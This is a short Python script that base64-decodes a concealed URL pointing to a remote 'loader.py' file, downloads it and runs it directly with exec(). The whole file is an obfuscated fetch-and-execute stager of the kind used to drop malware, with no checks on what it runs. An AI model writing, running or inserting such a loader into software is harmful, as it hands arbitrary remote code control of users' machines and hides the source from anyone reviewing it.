import base64
import urllib.request

def obtain_code():
    encoded_url = "aHR0cDovL2ZpbGVzZXJ2ZXIuZGF0YXJvb20uanAvYXNzZXRzL2xvYWRlci5weQ=="
    decoded_url = base64.b64decode(encoded_url).decode("utf-8")
    with urllib.request.urlopen(decoded_url) as response:
        return response.read()

def run_code(code):
    exec(code)

def main():
    code = obtain_code()
    run_code(code)

if __name__ == '__main__':
    main()
